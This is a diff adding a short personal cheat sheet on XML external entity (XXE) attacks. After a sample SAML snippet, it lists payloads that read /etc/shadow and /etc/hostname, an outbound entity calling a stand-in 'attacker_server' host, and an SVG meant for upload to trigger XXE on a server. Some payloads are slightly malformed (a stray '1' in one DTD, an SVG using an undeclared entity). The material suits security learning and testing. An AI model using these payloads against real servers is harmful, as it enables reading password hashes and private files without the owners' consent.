@@ -1,0 +1,57 @@
+This is how XML looks like
+<saml:AttributeStatement>
+  <saml:Attribute Name="username">
+    <saml:AttributeValue>
+      saitleop
+    </saml:AttributeValue>
+  </saml:Attribute>
+</saml:AttributeStatement>
+
+XML documents can also use external entities to access either local or remote content with a URL. If an entity’s value is preceded by a SYSTEM key-
+word, the entity is an external entity, and its value will be loaded from the URL. You can see here that the following DTD declares an external entity
+named file, and the value of file is the contents of file:///example.txt on the local filesystem:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY file SYSTEM "file:///example.txt">
+]>
+<example>&file;</example>
+
+opening /etc/shadow file on server
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+1 <!ENTITY file SYSTEM "file:///etc/shadow">
+]>
+<example>&file;</example>
+Classic XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test SYSTEM "Hello!">
+]>
+<example>&test;</example>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test SYSTEM "file:///etc/hostname">
+]>
+<example>&test;</example>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test PUBLIC "abc" "file:///etc/hostname">
+]>
+<example>&test;</example>
+
+Outbound XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
+]>
+
+Embedding XXE in img 
+
+<svg width="500" height="500">
+<circle cx="50" cy="50" r="40" fill="blue" />
+<text font-size="16" x="0" y="16">&test;</text>
+</svg>     save as .svg and upload to server
+
